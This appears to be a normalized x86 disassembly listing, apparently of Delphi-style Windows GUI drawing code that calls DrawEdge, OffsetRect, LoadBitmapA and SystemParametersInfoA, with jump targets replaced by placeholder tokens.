mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44ab98
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41cef4
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41db3c
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41d6ec
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41cc28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403104
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41db3c
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44ab98
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b6d7
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_449c5c
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44ab98
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_44b6f0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_44bff8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d798
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41d3f4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41cc28
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404260
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41d3f4
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d798
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_447984
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41db3c
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d3ec
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41d3f4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41d3f4
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d798
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d3ec
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_423ea8
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d3c8
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d798
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d798
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_421cbc
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_44bb3b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_422e04
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41cc28
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_447984
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d3f4
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44ab98
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41cef4
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41db3c
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d91c
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_447e9c
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41db3c
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41d6ec
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41cc28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403104
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44ab98
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bfff
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_449c5c
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_41d99c
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_44ab98
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_44c14c
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_44cb30
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_44c17c
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_44c1c8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_44c3aa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_403300
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_44c17c
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_44cb30
mov esi eax
mov eax edi
call sub_44c14c
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_404260
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
